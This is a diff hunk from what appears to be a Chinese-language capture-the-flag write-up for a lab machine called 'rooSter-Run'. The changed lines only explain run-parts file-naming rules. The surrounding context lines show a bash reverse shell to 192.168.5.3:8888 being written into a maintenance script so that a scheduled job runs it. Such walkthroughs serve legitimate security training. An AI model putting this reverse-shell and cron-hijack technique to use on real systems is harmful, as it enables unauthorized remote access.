@@ -91,7 +91,7 @@ matthieu@rooSter-Run:~$ cat user.txt
 echo -e '#!/bin/bash\n/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' > /opt/maintenance/pre-prod-tasks/run.sh; chmod +x /opt/maintenance/pre-prod-tasks/run.sh
 ```
 
-/usr/bin/run-parts 默认情况下执行的脚本不能带扩展名，所以在文件执行 cp 后，执行 mv 操作去掉 sh 后缀：
+/usr/bin/run-parts 默认情况下执行的脚本不能带扩展名(如果没有给出 --lsbsysinit 选项或 --regex 选项，则名称必须完全由 ASCII 大写和小写字母、ASCII 数字、ASCII 下划线和 ASCII 减号连字符组成)，所以在文件执行 cp 后，执行 mv 操作去掉 sh 后缀：
 
 ```
 matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ mv run.sh run
